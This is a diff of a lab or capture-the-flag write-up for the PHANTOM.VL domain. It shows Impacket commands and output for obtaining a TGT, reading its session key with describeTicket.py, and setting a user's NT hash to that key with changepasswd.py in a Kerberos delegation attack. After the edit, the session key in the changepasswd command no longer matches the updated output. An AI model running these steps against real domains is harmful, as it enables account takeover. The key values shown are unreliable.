@@ -688,25 +688,25 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in wsilva.ccache
 ```
 
-Then ill grab a TGT for the user configured for delegation, i need to use pypykatz in the command to change the password into an NTLM, the use of an NTLM forces rc4, which inm t
+Then ill grab a TGT for the user configured for delegation, i need to use pypykatz in the command to change the password into an NTLM, the use of an NTLM forces rc4, which in ths case is required
 
 ```python
-describeTicket.py wsilva.ccache 
+describeTicket.py wsilva.ccache
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Number of credentials in cache: 1
 [*] Parsing credential[0]:
-[*] Ticket Session Key            : 547507c1fd1b1c7312e896f082e209322361fc166d4d51446913a697fe2478ee
+[*] Ticket Session Key            : 5dc4a686c981d0c04c3c648f4e1cfb9c
 [*] User Name                     : wsilva
 [*] User Realm                    : PHANTOM.VL
 [*] Service Name                  : krbtgt/PHANTOM.VL
 [*] Service Realm                 : PHANTOM.VL
-[*] Start Time                    : 15/08/2026 19:30:29 PM
-[*] End Time                      : 16/08/2026 05:30:29 AM
-[*] RenewTill                     : 16/08/2026 19:30:29 PM
+[*] Start Time                    : 16/08/2026 14:59:59 PM
+[*] End Time                      : 17/08/2026 00:59:59 AM
+[*] RenewTill                     : 17/08/2026 14:59:58 PM
 [*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
-[*] KeyType                       : aes256_cts_hmac_sha1_96
-[*] Base64(key)                   : VHUHwf0bHHMS6JbwguIJMiNh/BZtTVFEaROml/4keO4=
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : XcSmhsmB0MBMPGSPThz7nA==
 [*] Decoding unencrypted data in credential[0]['ticket']:
 [*]   Service Name                : krbtgt/PHANTOM.VL
 [*]   Service Realm               : PHANTOM.VL
@@ -714,7 +714,7 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 [-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
 ```
 
-Then ill use this impacket script to get the ticket session key
+Then ill use this impacket script to get the ticket session key, as seen above its using rc4 instead o aes256_cts_hmac_sha1_96
 
 ```python
 changepasswd.py -newhashes ':547507c1fd1b1c7312e896f082e209322361fc166d4d51446913a697fe2478ee' phantom.vl/wsilva:'Password123!'@dc.phantom.vl
